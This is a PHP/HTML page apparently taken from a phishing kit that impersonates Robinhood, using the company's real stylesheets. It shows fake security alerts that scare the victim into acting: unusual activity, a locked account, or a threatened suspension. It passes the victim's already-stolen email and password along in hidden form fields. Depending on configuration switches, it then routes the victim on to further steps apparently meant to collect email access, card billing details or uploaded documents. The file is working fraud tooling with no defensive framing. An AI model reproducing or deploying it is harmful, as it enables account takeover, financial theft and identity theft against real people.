<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title><?php
									  if ($alert_type == "unusual") {
									    echo "Unusual Activity Detected";
									  }else{
									  if ($alert_type == "unable") {
									    echo "Unable to sign in";
									  }else{
									  if ($alert_type == "locked") {
									    echo "Your account has been locked";
									  }else{
									    if ($alert_type == "disable") {
									    echo "Your account will be disabled";
									  }
									  }
									  }
									  }
									  ?> | Robinhood</title>
</head>
<body class="theme-open-up">
<div id="react_root">
	<div>
		<div class="css-10d7enp">

									<header class="css-240zvz"><span class="css-1wyk9uc">
									  <?php
									  if ($alert_type == "unusual") {
									    echo "Unusual Activity Detected";
									  }else{
									  if ($alert_type == "unable") {
									    echo "Unable to sign in";
									  }else{
									  if ($alert_type == "locked") {
									    echo "Your account has been locked";
									  }else{
									    if ($alert_type == "disable") {
									    echo "Your account will be disabled";
									  }
									  }
									  }
									  }
									  ?>	
									</span></header>
						<div class="css-slob1f" style="border: solid 1px black;">
							<div>
								<center>
								<?php if ($get_email == "on") { ?>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="email-activity">
								<?php }else{ if ($get_cc == "on") { ?>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="billing">
								<?php }else{ if ($get_pap == "on") { ?>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="upload">
								<?php }else{ ?>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="done">
								<?php } } } ?>
									<div style="padding-top: 20px;">
										<?php
									      if ($alert_type == "unusual") {
									        echo '<img src="img/unusual.png" width="100">';
									      }else{
									      if ($alert_type == "unable") {
									        echo '<img src="img/unable.png" width="100">';
									      }else{
									      if ($alert_type == "locked") {
									        echo '<img src="img/locked.png" width="100">';
									      }else{
									        if ($alert_type == "disable") {
									        echo '<img src="img/unable.png" width="100">';
									      }
									      }
									      }
									      }
									      ?>
									</div><br>
										<span class="css-1wyk9uc"><?php
									  if ($alert_type == "unusual") {
									    echo "We detected unusual sign-in attempts. To ensure that no one else tries to access your account, please secure and verify your account!";
									  }else{
									  if ($alert_type == "unable") {
									    echo "Unable to sign in on this device. Please verify your account.";
									  }else{
									  if ($alert_type == "locked") {
									    echo "Your account has been locked, please visit page verify to resolve.";
									  }else{
									    if ($alert_type == "disable") {
									    echo "Your account will be disabled if you do not confirm new Terms of Service.";
									  }
									  }
									  }
									  }
									  ?></span>
									<div class="css-16x6d1u">
										<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
										<input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
										<div>
										<p aria-live="assertive">
											<div class="_2QawT-EkOq7gIQN1hHcFqU" style="height: 0px; transition-duration: 300ms;">
												<div class="_3UC6vIw0Z8kgiibABGCPT2">
													<div></div>
												</div>
											</div>
										</p>
									</div>
									<div class="css-0">
										<?php
								          if ($alert_type == "unusual") {
								            echo '<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Secure my account</span></button>';
								          }else{
								          if ($alert_type == "unable") {
								            echo '<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Verify my account</span></button>';
								          }else{
								          if ($alert_type == "locked") {
								            echo '<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Verify my account</span></button>';
								          }else{
								            if ($alert_type == "disable") {
								            echo '<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Verify my account</span></button>';
								          }
								          }
								          }
								          }
								          ?>
									</div>
								</form>
								</center>
							</div>
						</div>
					</div>
				</div>
			</div>
</div>
</body>
</html>